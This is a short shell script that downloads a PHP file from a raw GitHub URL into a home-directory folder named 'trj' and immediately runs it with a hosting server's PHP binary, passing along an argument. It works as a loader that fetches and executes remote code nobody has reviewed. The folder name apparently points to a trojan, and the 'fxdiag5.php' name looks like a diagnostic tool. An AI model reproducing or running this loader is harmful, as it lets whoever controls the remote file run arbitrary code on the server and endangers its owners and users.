#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxdiag5.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxdiag5.php?t=$(date +%s)" && mv fxdiag5.php.new fxdiag5.php
/opt/alt/php83/usr/bin/php fxdiag5.php "$1"
